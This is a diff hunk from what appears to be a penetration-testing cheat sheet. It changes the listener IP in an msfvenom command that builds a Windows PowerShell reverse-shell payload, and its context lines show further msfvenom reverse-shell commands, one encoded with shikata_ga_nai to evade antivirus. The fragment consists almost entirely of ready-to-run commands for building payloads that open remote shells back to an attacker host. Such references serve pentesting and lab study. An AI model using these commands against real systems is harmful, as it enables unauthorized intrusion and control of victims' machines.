@@ -69,7 +69,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e g
 ### Windows Powershell Reverse Shell
 
 ```
-msfvenom -p windows/x64/powershell_reverse_tcp lhost=10.10.14.9 lport=444 -f psh -o r444.ps1
+msfvenom -p windows/x64/powershell_reverse_tcp lhost=10.1.1.1 lport=444 -f psh -o r444.ps1
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
 ```
